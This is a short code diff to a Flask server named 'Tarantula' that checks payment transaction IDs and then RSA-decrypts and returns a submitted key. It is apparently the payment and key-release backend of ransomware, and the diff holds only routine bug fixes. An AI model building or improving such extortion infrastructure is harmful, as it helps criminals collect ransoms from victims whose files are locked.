@@ -9,7 +9,7 @@ if (os.path.exists("public-key.pub") == False):
 
 server = Flask("My Shiny Tarantula Server")
 # server.logger.disabled = True
-db = Database("tarantula.json", ".")
+db = Database("tarantula.json", "./")
 
 confirmedTransactions = [
     '8cf9637de652a773bf61883283958e76912fb0e1b8c5fd1c175a609df6a80bc4',
@@ -37,11 +37,11 @@ def payment_check():
                 "id": transactionId,
                 "encryptedKey": encryptedKey
             })
-            private_key = read_private_key("private.pem")
+            private_key = read_private_key("private-key.pem")
             decryptedKey = rsa_decrypt(encryptedKey, private_key)
             return jsonify({
                 "status": "success",
-                "key": decryptedKey
+                "key": decryptedKey.decode()
             })
     else:
         return jsonify({
